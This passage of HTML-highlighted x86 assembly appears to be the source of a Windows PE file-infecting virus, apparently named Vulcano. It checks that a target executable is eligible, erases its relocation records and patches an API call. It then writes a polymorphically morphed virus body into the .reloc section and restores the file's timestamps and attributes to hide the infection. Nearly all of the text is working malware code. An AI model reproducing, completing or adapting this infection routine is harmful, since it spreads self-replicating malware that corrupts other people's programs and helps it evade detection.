</span><span class="sc5">ddMapViewOfFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;map view of file</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">;save base address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nOpen</span><span class="sc0">

</span><span class="sc5">endMapFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">push_LARGE_0</span><span class="sc0">                </span><span class="sc1">;store base address</span><span class="sc0">
</span><span class="sc5">lpFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddUnmapViewOfFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;unmap view of file</span><span class="sc0">

</span><span class="sc5">endCreateMapping</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">push_LARGE_0</span><span class="sc0">                </span><span class="sc1">;store handle</span><span class="sc0">
</span><span class="sc5">hMapFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;close file mapping</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer.WFD_ftLastWriteTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer.WFD_ftLastAccessTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer.WFD_ftCreationTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddSetFileTime</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;set back file time</span><span class="sc0">

    </span><span class="sc5">push_LARGE_0</span><span class="sc0">                </span><span class="sc1">;store handle</span><span class="sc0">
</span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;close file</span><span class="sc0">

</span><span class="sc5">r_attr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">data_buffer.WFD_szFileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileAttributesA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;set back file attributes</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c_error</span><span class="sc0">             </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">nOpen</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0"> </span><span class="sc1">;must be MZ</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">     </span><span class="sc1">;must be PE\0\0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.FH_Machine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">  </span><span class="sc1">;must be 386+</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">    </span><span class="sc1">;must be executable</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">         </span><span class="sc1">;mustnt be DLL</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_SYSTEM</span><span class="sc0">      </span><span class="sc1">;mustnt be system file</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_Subsystem</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SUBSYSTEM_NATIVE</span><span class="sc0">     </span><span class="sc1">;and mustnt be driver (thanx GriYo !)</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;must be more than one section</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;get to section header</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">               </span><span class="sc1">;quit if no relocs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">              </span><span class="sc1">;is it .reloc section?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1a00h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">               </span><span class="sc1">;check if .reloc is big enough</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;erase .reloc records</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;now we will try to</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;patch</span><span class="sc0">
</span><span class="sc5">it_patch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;one API call</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crcpAPIs</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get CRC32</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_patch</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_patch</span><span class="sc0">               </span><span class="sc1">;quit if end of record</span><span class="sc0">
</span><span class="sc5">c_patch</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;patch address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;CRC32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">r2rp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;infection stage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PatchIT</span><span class="sc0">                </span><span class="sc1">;try to patch API call</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;save address</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_patch</span><span class="sc0">               </span><span class="sc1">;quit if we got address</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">it_patch</span><span class="sc0">                </span><span class="sc1">;API call not found, try another API</span><span class="sc0">

</span><span class="sc5">end_patch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get Image base</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">compressed</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ImgBase</span><span class="sc4">-</span><span class="sc5">decompressed</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">compressed</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ddAPI</span><span class="sc4">-</span><span class="sc5">decompressed</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;store prev. API call</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;save new one</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">compressed</span><span class="sc4">+(</span><span class="sc5">VulcanoInit</span><span class="sc4">-</span><span class="sc5">decompressed</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;where to write body</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">decompressed</span><span class="sc4">-</span><span class="sc5">VulcanoInit</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;size of virus body</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BPE32</span><span class="sc0">              </span><span class="sc1">;write morphed body to file!</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;save size</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;restore API call</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">
                        </span><span class="sc1">;set flags</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get virtual size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;correct it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;align SizeOfRawData</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_CNT_INITIALIZED_DATA</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">rs_ok</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_SizeOfInitializedData</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc1">;update next field, if needed</span><span class="sc0">
</span><span class="sc5">rs_ok</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_SectionAlignment</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;new SizeOfImage</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endMapFile</span><span class="sc0">          </span><span class="sc1">;everything is ok, we can quit</span><span class="sc0">

</span><span class="sc5">CheckFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
